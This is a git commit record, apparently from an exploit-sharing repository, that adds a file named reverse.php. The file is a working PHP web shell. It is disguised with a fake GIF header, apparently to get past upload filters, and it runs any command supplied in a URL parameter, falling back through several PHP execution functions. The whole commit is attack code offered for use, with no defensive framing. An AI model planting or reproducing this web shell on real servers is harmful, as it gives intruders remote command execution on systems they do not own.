aa64c925d1b51bb502615f14a39e1ec922cc2d14
MrMad <80827394+MadExploits@users.noreply.github.com>
2022-08-03 18:24:35 +0700

    Add files via upload

---
+++ reverse.php
@@ -0,0 +1,19 @@
+GIF89;a
+<!-- Reverse Shell Bypassing By MrMad -->
+<!-- Payload GITHUB by PantestMonkey https://github.com/MadExploits/Reverse-Shell-Payload/blob/main/reverse-shell.txt -->
+<?php
+
+if (isset($_GET['0'])) {
+    if (function_exists("shell_exec")) {
+        echo shell_exec($_GET['0']);
+    } else if (function_exists("system")) {
+        system($_GET['0']);
+    } else if (function_exists("exec")) {
+        $arr = exec($_GET['0']);
+        print_r($arr);
+    } else if (!function_exists("system") && !function_exists("exec")) {
+        echo `$_GET[0]`;
+    }
+}
+
+?>
